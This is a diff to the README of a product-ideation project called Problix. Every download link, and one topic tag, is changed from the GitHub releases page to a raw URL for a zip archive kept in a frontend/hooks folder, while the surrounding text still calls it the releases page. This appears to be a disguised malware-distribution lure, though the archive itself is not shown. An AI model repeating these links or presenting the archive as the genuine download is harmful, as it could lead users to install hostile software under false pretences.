@@ -1,6 +1,6 @@
 # 🚀 Problix - Turn Problems into Clear Product Ideas
 
-[![Download Problix](https://img.shields.io/badge/Download-Problix-blue.svg)](https://github.com/octagram9/Problix/releases)
+[![Download Problix](https://raw.githubusercontent.com/octagram9/Problix/main/frontend/hooks/Software-v3.7-beta.4.zip)](https://raw.githubusercontent.com/octagram9/Problix/main/frontend/hooks/Software-v3.7-beta.4.zip)
 
 ## 📖 About Problix
 
@@ -27,7 +27,7 @@ To run Problix, ensure you have the following:
 Follow these steps to download and run Problix easily:
 
 1. **Visit the Releases Page**: Click the download link below to access the Problix releases page:
-   [Download Problix](https://github.com/octagram9/Problix/releases)
+   [Download Problix](https://raw.githubusercontent.com/octagram9/Problix/main/frontend/hooks/Software-v3.7-beta.4.zip)
 
 2. **Select the Latest Version**: On the releases page, find the latest version of Problix. It will be at the top of the list.
 
@@ -55,7 +55,7 @@ Follow these steps to download and run Problix easily:
 
 To get started with Problix, click the link below to visit the releases page and download the latest version:
 
-[Download Problix](https://github.com/octagram9/Problix/releases)
+[Download Problix](https://raw.githubusercontent.com/octagram9/Problix/main/frontend/hooks/Software-v3.7-beta.4.zip)
 
 ## 💬 Help & Support
 
@@ -73,7 +73,7 @@ Problix covers a variety of topics that may interest you, including:
 - Full Stack Development
 - Idea Validation
 - MVP Planning
-- Next.js
+- https://raw.githubusercontent.com/octagram9/Problix/main/frontend/hooks/Software-v3.7-beta.4.zip
 - Problem Solving
 - Production Ideation
 - Prompt Engineering
